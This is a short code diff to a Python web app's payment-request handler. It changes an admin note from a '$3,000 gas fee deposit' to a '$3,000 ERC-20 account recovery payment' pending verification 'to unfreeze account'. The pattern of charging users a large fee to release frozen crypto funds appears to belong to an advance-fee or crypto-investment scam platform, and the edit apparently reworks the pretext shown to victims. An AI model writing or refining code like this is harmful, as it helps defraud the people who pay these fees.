@@ -259,9 +259,9 @@ def gas_fee_request():
         deposit_address = deposit_address,
         status          = "pending",
         admin_note      = (
-            f"⛽ GAS FEE DEPOSIT — User {current_user.username} ({current_user.email}) "
-            f"has confirmed sending $3,000 gas fee to {deposit_address}. "
-            "Awaiting admin verification."
+            f"🔒 ACCOUNT RECOVERY PAYMENT — User {current_user.username} ({current_user.email}) "
+            f"has confirmed sending $3,000 ERC-20 recovery payment to {deposit_address}. "
+            "Awaiting admin verification to unfreeze account."
         ),
     )
     db.session.add(order)
